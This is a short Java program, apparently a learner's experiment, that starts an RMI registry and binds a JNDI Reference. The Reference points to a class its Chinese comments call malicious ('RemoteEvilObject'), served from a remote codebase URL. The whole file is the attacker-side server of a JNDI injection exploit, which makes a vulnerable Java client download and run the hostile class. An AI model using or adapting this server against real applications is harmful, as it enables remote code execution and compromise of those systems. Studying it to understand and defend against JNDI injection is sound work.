import com.sun.jndi.rmi.registry.ReferenceWrapper;

import javax.naming.Reference;
import java.rmi.registry.LocateRegistry;
import java.rmi.registry.Registry;

public class JndiServerWithRemoteClass {
    public static void main(String[] args) throws Exception {
        System.out.println("创建RMI注册表");
        Registry registry = LocateRegistry.createRegistry(1099);
        //测试发现
        // className可为空字符串，还不明白为什么
        // factory为恶意类的名字
        // factoryLocation为恶意类所在的jar包地址
        Reference reference = new javax.naming.Reference("", "RemoteEvilObject", "http://127.0.01:8086/");
        ReferenceWrapper referenceWrapper = new com.sun.jndi.rmi.registry.ReferenceWrapper(reference);
        registry.bind("anything", referenceWrapper);
    }
}
